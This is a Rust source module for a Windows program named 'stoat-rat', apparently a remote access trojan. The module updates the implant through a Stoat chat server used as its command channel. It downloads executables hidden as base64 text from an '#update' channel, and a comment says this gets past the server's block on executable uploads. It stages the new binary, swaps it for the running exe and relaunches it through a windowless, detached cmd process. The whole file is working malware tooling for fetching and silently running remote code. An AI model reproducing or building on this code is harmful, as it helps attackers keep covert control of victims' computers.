// language: Rust, file: src/update.rs, target: Windows
// Self-update: pull the newest build posted in the `#update` channel, stage it beside the
// running exe, then swap files and relaunch after this process exits.
//
// Stoat's file server blocks executables/archives by MIME, so the published payload is a
// base64 text file. Raw PE uploads (if the blocklist is ever relaxed) are still accepted.
#![allow(dead_code)]
use anyhow::{bail, Context, Result};
use base64::Engine;
use std::os::windows::process::CommandExt;

use crate::config::Config;
use crate::stoat::Stoat;
use crate::workspace::{self, Workspace};

const CREATE_NO_WINDOW: u32 = 0x0800_0000;
const CREATE_NEW_PROCESS_GROUP: u32 = 0x0000_0200;

/// Decode an uploaded payload: raw PE bytes, or base64 text wrapping a PE.
fn decode_payload(raw: &[u8]) -> Option<Vec<u8>> {
    if raw.get(..2) == Some(b"MZ") {
        return Some(raw.to_vec());
    }
    let text: String = std::str::from_utf8(raw)
        .ok()?
        .chars()
        .filter(|c| !c.is_whitespace())
        .collect();
    let decoded = base64::engine::general_purpose::STANDARD.decode(text).ok()?;
    if decoded.get(..2) == Some(b"MZ") {
        Some(decoded)
    } else {
        None
    }
}

/// Finds the newest valid build in the update channel and stages it as `<exe dir>\stoat-rat.new`.
/// Returns a label when a different build was staged.
pub async fn stage(st: &Stoat, cfg: &Config, ws: &Workspace) -> Result<Option<String>> {
    let update_ch = match &cfg.update_channel {
        Some(c) if !c.is_empty() => c.clone(),
        _ => workspace::find_channel_by_name(st, &ws.server, "update")
            .await?
            .context("no channel named 'update' in this server")?,
    };

    let page = st
        .get_json(&format!("/channels/{update_ch}/messages?limit=50"))
        .await?;
    let msgs = page.as_array().cloned().unwrap_or_default();

    // Gather attachments, newest first (Stoat ids are ULIDs → sort by time).
    let mut cands: Vec<(String, String, String, String)> = Vec::new(); // (_id, tag, att, filename)
    for m in &msgs {
        let mid = m["_id"].as_str().unwrap_or("").to_string();
        if let Some(atts) = m["attachments"].as_array() {
            for a in atts {
                let id = a["_id"].as_str().unwrap_or("");
                if id.is_empty() {
                    continue;
                }
                cands.push((
                    mid.clone(),
                    a["tag"].as_str().unwrap_or("attachments").to_string(),
                    id.to_string(),
                    a["filename"].as_str().unwrap_or("payload").to_string(),
                ));
            }
        }
    }
    cands.sort_by(|a, b| b.0.cmp(&a.0));

    if cands.is_empty() {
        bail!("no attachments in the update channel");
    }

    let exe = std::env::current_exe().context("current_exe")?;
    let current = std::fs::read(&exe).ok();

    for (_, tag, id, fname) in cands {
        let raw = st.download(&tag, &id).await?;
        let Some(bytes) = decode_payload(&raw) else {
            continue;
        };
        if bytes.len() < 1024 {
            continue;
        }
        if current.as_deref() == Some(bytes.as_slice()) {
            return Ok(None);
        }
        let dir = exe.parent().context("exe has no parent")?;
        std::fs::write(dir.join("stoat-rat.new"), &bytes)?;
        return Ok(Some(format!("{fname} ({} bytes)", bytes.len())));
    }
    bail!("no valid build found in the update channel");
}

/// Swap the staged build in and relaunch it after this process releases the singleton.
pub fn relaunch_and_exit() -> Result<()> {
    let exe = std::env::current_exe().context("current_exe")?;
    let dir = exe.parent().context("exe has no parent")?;
    let staged = dir.join("stoat-rat.new");
    let old = dir.join("stoat-rat.old");
    if !staged.exists() {
        bail!("no staged build");
    }
    let _ = std::fs::remove_file(&old);
    std::fs::rename(&exe, &old).context("rename running exe")?;
    std::fs::rename(&staged, &exe).context("move staged build into place")?;

    // Detached relaunch after a short delay so this process can exit and free the singleton.
    let cmd = format!(
        "/C ping -n 3 127.0.0.1 >nul & start \"\" \"{}\"",
        exe.display()
    );
    std::process::Command::new("cmd")
        .raw_arg(cmd)
        .creation_flags(CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP)
        .spawn()?;
    Ok(())
}
